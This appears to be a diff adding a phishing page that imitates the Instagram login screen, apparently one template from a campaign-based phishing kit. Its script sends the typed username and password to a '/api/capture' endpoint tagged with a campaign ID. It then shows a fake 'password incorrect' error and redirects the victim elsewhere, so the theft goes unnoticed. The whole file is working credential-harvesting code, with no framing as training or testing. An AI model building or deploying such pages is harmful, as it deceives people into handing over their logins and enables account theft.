@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .logo {
+            font-family: 'Segoe UI', cursive;
+            font-size: 2.2rem;
+            margin-bottom: 30px;
+            color: #262626;
+        }
+        .error-msg {
+            background: #fed0d0;
+            color: #8b0000;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            margin-bottom: 12px;
+            display: none;
+        }
+        form { display: flex; flex-direction: column; gap: 6px; }
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 0.85rem;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+        }
+        button.active { opacity: 1; }
+        button:hover { background: #1877f2; }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider span { padding: 0 18px; }
+        .forgot-link {
+            display: block;
+            margin-top: 12px;
+            font-size: 0.75rem;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 30px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #262626;
+        }
+        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        .get-app { text-align: center; margin-top: 20px; font-size: 0.9rem; }
+        .footer { margin-top: 40px; font-size: 0.7rem; color: #8e8e8e; text-align: center; }
+        .loading { display: none; margin-top: 10px; font-size: 0.85rem; color: #8e8e8e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
+            <form id="loginForm">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" id="loginBtn">Log In</button>
+            </form>
+            <div class="divider"><span>OR</span></div>
+            <a href="#" style="color: #385185; font-size: 0.85rem; font-weight: 600; text-decoration: none;">Log in with Facebook</a>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        <div class="get-app">Get the app.</div>
+        <div class="loading" id="loadingMsg">Verifying your credentials...</div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = this.username.value;
+            const password = this.password.value;
+            const btn = document.getElementById('loginBtn');
+            const loading = document.getElementById('loadingMsg');
+            const error = document.getElementById('errorMsg');
+
+            btn.disabled = true;
+            btn.textContent = 'Logging in...';
+            loading.style.display = 'block';
+            error.style.display = 'none';
+
+            try {
+                const res = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        campaignId: '{{CAMPAIGN_ID}}',
+                        username: username,
+                        password: password
+                    })
+                });
+
+                const data = await res.json();
+                await new Promise(r => setTimeout(r, 1500));
+
+                if (data.redirect) {
+                    error.style.display = 'block';
+                    loading.style.display = 'none';
+                    btn.textContent = 'Redirecting...';
+                    setTimeout(() => {
+                        window.location.href = data.redirect;
+                    }, 2000);
+                }
+            } catch (err) {
+                loading.style.display = 'none';
+                btn.disabled = false;
+                btn.textContent = 'Log In';
+                error.textContent = 'Connection error. Please try again.';
+                error.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
